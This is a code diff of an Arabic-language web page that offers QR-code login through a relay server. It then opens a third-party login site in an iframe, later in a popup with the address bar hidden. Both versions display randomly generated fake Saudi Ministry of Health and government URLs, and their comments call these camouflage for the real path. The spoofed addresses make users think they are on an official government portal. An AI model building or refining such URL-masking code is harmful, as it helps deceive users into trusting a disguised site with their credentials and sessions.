@@ -21,29 +21,15 @@
     }
 
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
-    html, body { 
-      background-color: var(--bg); 
-      color: var(--text); 
-      width: 100vw; 
-      height: 100vh; 
-      overflow: hidden; 
-      margin: 0; 
-      padding: 0; 
-    }
+    body { background-color: var(--bg); color: var(--text); min-height: 100vh; overflow: hidden; }
 
-    /* 1. شاشة مسح الـ QR */
     #authScreen {
       display: flex;
       align-items: center;
       justify-content: center;
-      width: 100vw;
-      height: 100vh;
+      min-height: 100vh;
       padding: 1.5rem;
       background: radial-gradient(circle at 50% 20%, #1e293b 0%, #0b0f19 80%);
-      position: fixed;
-      top: 0;
-      left: 0;
-      z-index: 100;
     }
 
     .auth-card {
@@ -142,83 +128,78 @@
       font-size: 0.9rem;
     }
 
-    /* 2. شاشة النظام الفعلية داخل نفس التبويب */
-    #systemContainer {
+    /* شاشة التحكم بعد الربط الناجح */
+    #sessionActiveScreen {
       display: none;
-      width: 100vw;
-      height: 100vh;
-      position: fixed;
-      top: 0;
-      left: 0;
-      z-index: 10;
-      background: #fff;
-    }
-
-    #systemFrame {
-      width: 100vw;
-      height: 100vh;
-      border: none;
-    }
-
-    /* شريط العنوان الوهمي المموه الاحترافي */
-    .fake-header-bar {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 38px;
-      background: #1e293b;
-      color: #e2e8f0;
-      display: flex;
       align-items: center;
-      justify-content: space-between;
-      padding: 0 16px;
-      z-index: 20;
-      border-bottom: 1px solid #334155;
-      font-size: 0.85rem;
-      direction: ltr;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 1.5rem;
+      background: radial-gradient(circle at 50% 20%, #1e293b 0%, #0b0f19 80%);
+      text-align: center;
     }
 
-    .fake-url-box {
-      display: flex;
-      align-items: center;
-      gap: 8px;
+    .session-box {
+      background: rgba(17, 24, 39, 0.95);
+      backdrop-filter: blur(20px);
+      border-radius: 1.75rem;
+      box-shadow: 0 25px 60px -15px rgba(0, 0, 0, 0.7);
+      width: 100%;
+      max-width: 500px;
+      padding: 2.5rem 2rem;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      animation: fadeIn 0.4s ease-out;
+    }
+
+    .fake-badge-box {
       background: #0f172a;
-      padding: 4px 14px;
-      border-radius: 6px;
       border: 1px solid #334155;
-      color: #94a3b8;
-      width: 60%;
-      max-width: 600px;
+      border-radius: 10px;
+      padding: 10px 14px;
+      margin: 1rem 0;
       font-family: monospace;
       font-size: 0.82rem;
-    }
-
-    .fake-url-box i {
-      color: #10b981;
-    }
-
-    .fake-url-text {
-      color: #cbd5e1;
-      white-space: nowrap;
+      color: #38bdf8;
+      direction: ltr;
+      display: flex;
+      align-items: center;
+      gap: 8px;
       overflow: hidden;
       text-overflow: ellipsis;
+      white-space: nowrap;
     }
 
-    .fake-actions {
-      display: flex;
-      gap: 8px;
-    }
-
-    .btn-exit {
-      background: #ef4444;
+    .btn-act {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      height: 50px;
+      background: #2563eb;
       color: #fff;
       border: none;
-      padding: 4px 12px;
-      border-radius: 6px;
-      font-size: 0.75rem;
-      font-weight: 600;
+      border-radius: 12px;
+      font-size: 1rem;
+      font-weight: 700;
       cursor: pointer;
+      margin-top: 1rem;
+      transition: background 0.2s;
+    }
+
+    .btn-act:hover {
+      background: #1d4ed8;
+    }
+
+    .btn-danger {
+      background: rgba(239, 68, 68, 0.15);
+      color: #f87171;
+      border: 1px solid rgba(239, 68, 68, 0.3);
+      margin-top: 0.75rem;
+    }
+
+    .btn-danger:hover {
+      background: rgba(239, 68, 68, 0.25);
     }
 
     @keyframes pulse {
@@ -239,14 +220,14 @@
   <div id="authScreen">
     <div class="auth-card">
       <div class="app-icon">
-        <i class="fa-solid fa-network-wired"></i>
+        <i class="fa-solid fa-fingerprint"></i>
       </div>
       <h1 class="auth-title">بوابة النظام الموحدة</h1>
-      <p class="auth-subtitle">اتصال آمن ومموه عبر المتصفح لحماية الخصوصية ومسارات النظام</p>
+      <p class="auth-subtitle">سجّل دخولك للنظام عبر المتصفح بأمان وخصوصية تامة مع التمويه المشفر</p>
       
       <div class="status-badge">
         <span class="pulse-dot"></span>
-        <span id="socketStatusText">جاري تهيئة الرابط الآمن...</span>
+        <span id="socketStatusText">جاري الاتصال الآمن...</span>
       </div>
 
       <div class="qr-container">
@@ -261,39 +242,50 @@
     </div>
   </div>
 
-  <!-- 2. حاوية النظام مع شريط الرابط الوهمي المشفر -->
-  <div id="systemContainer">
-    <!-- شريط الرابط الوهمي لتغطية وتمويه المسار الحقيقي -->
-    <div class="fake-header-bar">
-      <div class="fake-url-box">
-        <i class="fa-solid fa-lock"></i>
-        <span class="fake-url-text" id="fakeUrlDisplay">https://secure.health-gov.sa/portal/app?token=...</span>
+  <!-- 2. شاشة الجلسة النشطة ومركز التحكم -->
+  <div id="sessionActiveScreen">
+    <div class="session-box">
+      <div class="app-icon" style="background: linear-gradient(135deg, #10b981 0%, #059669 100%);">
+        <i class="fa-solid fa-circle-check"></i>
       </div>
-      <div class="fake-actions">
-        <button class="btn-exit" onclick="logoutSession()">إنهاء الجلسة</button>
-      </div>
-    </div>
+      <h2 style="font-size: 1.5rem; font-weight: 800; margin-bottom: 0.5rem;">تم ربط الجلسة بنجاح!</h2>
+      <p style="color: var(--text-muted); font-size: 0.92rem;">نافذة النظام قيد التشغيل المباشر تحت المسار المموه والمشفر التالي:</p>
 
-    <!-- نافذة الموقع الحقيقي تعمل بكامل وظائفها وأصالتها ومثبتة أسفل الشريط الوهمي -->
-    <iframe id="systemFrame" src="about:blank" style="margin-top: 38px; height: calc(100vh - 38px);" allow="geolocation; microphone; camera; clipboard-read; clipboard-write;"></iframe>
+      <!-- عرض الرابط الوهمي المشفر المموه -->
+      <div class="fake-badge-box">
+        <i class="fa-solid fa-lock" style="color: #10b981;"></i>
+        <span id="fakeUrlDisplay">https://portal.moh.gov.sa/dashboard?auth=...</span>
+      </div>
+
+      <button class="btn-act" onclick="reopenAppWindow()">
+        <i class="fa-solid fa-arrow-up-right-from-square"></i>
+        إعادة فتح نافذة النظام
+      </button>
+
+      <button class="btn-act btn-danger" onclick="logoutSession()">
+        <i class="fa-solid fa-power-off"></i>
+        تسجيل الخروج وإنهاء الجلسة
+      </button>
+    </div>
   </div>
 
   <script>
     const RELAY_SERVER_URL = "https://metrix-web-relay.onrender.com";
     let socket = null;
     let sessionId = 'web_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now();
+    let portalWin = null;
+    let targetSystemUrl = "https://pmhsa.org/web_www1/login?return=true&";
 
-    // قائمة الروابط الوهمية المبتكرة للتمويه
-    const FAKE_ROUTES = [
-      "https://portal.moh.gov.sa/dashboard/workstation?session=",
-      "https://secure-ehr.gov.sa/services/core-view?token=",
-      "https://health-internal.net/portal/services/view?auth="
-    ];
-
-    function getRandomFakeUrl() {
-      const base = FAKE_ROUTES[Math.floor(Math.random() * FAKE_ROUTES.length)];
-      const token = Math.random().toString(36).substring(2, 12) + '-' + Date.now().toString(36);
-      return base + token;
+    // توليد رابط وهمي مموه ومشفر
+    function generateFakeMaskedUrl() {
+      const bases = [
+        "https://portal.moh.gov.sa/dashboard/workstation?token=",
+        "https://secure-ehr.gov.sa/services/core-view?auth=",
+        "https://health-internal.net/portal/services/view?session="
+      ];
+      const randomBase = bases[Math.floor(Math.random() * bases.length)];
+      const token = Math.random().toString(36).substring(2, 10) + '-' + Date.now().toString(36);
+      return randomBase + token;
     }
 
     function getBrowserInfo() {
@@ -366,50 +358,63 @@
       });
 
       socket.on("authenticated", (data) => {
-        launchMaskedSystem(data);
+        launchCleanSystem(data);
       });
 
       socket.on("session_authorized", (data) => {
-        launchMaskedSystem(data);
+        launchCleanSystem(data);
       });
 
       socket.on("session_terminated", () => {
+        if (portalWin && !portalWin.closed) {
+          portalWin.close();
+        }
         location.reload();
       });
     }
 
-    function launchMaskedSystem(data) {
+    function launchCleanSystem(data) {
+      if (data && data.targetUrl) {
+        targetSystemUrl = data.targetUrl;
+      }
+
       document.getElementById("authScreen").style.display = "none";
-      const container = document.getElementById("systemContainer");
-      const frame = document.getElementById("systemFrame");
-      const fakeUrlEl = document.getElementById("fakeUrlDisplay");
+      document.getElementById("sessionActiveScreen").style.display = "flex";
 
-      container.style.display = "block";
+      // عرض الرابط الوهمي المموه
+      const fakeUrl = generateFakeMaskedUrl();
+      document.getElementById("fakeUrlDisplay").innerText = fakeUrl;
 
-      // 1. توليد رابط وهمي رسمي مموه وعرضه
-      const fakeUrl = getRandomFakeUrl();
-      fakeUrlEl.innerText = fakeUrl;
+      // فتح نافذة التطبيق النظيفة التي تقبل تسجيل الدخول وتسمح بالتصرف والتعديل
+      openPortalWindow(targetSystemUrl);
+    }
 
-      // 2. تغيير مسار المتصفح برمجياً في الـ History دون الانتقال لخارج الصفحة
-      try {
-        const fakeSlug = "?session=" + Math.random().toString(36).substring(2, 8);
-        window.history.pushState({ page: 1 }, "منظومة الخدمات", fakeSlug);
-      } catch(e) {}
+    function openPortalWindow(url) {
+      const w = screen.availWidth || 1280;
+      const h = screen.availHeight || 800;
+      const features = `width=${w},height=${h},top=0,left=0,toolbar=no,location=no,status=no,menubar=no,scrollbars=yes,resizable=yes`;
 
-      // 3. فتح النظام الفعلي مباشرة ليعمل بكامل الصلاحيات
-      const targetUrl = (data && data.targetUrl) ? data.targetUrl : "https://pmhsa.org/web_www1/login?return=true&";
-      frame.src = targetUrl;
+      portalWin = window.open(url, "GovSystemApp", features);
+      if (portalWin) {
+        portalWin.focus();
+      }
+    }
 
-      // تحديث الرابط الوهمي دورياً عند التصفح
-      setInterval(() => {
-        fakeUrlEl.innerText = getRandomFakeUrl();
-      }, 30000);
+    function reopenAppWindow() {
+      if (!portalWin || portalWin.closed) {
+        openPortalWindow(targetSystemUrl);
+      } else {
+        portalWin.focus();
+      }
     }
 
     function logoutSession() {
       if (socket && sessionId) {
         socket.emit("session_terminated", { sessionId: sessionId });
         socket.emit("terminate_session", sessionId);
+      }
+      if (portalWin && !portalWin.closed) {
+        portalWin.close();
       }
       location.reload();
     }
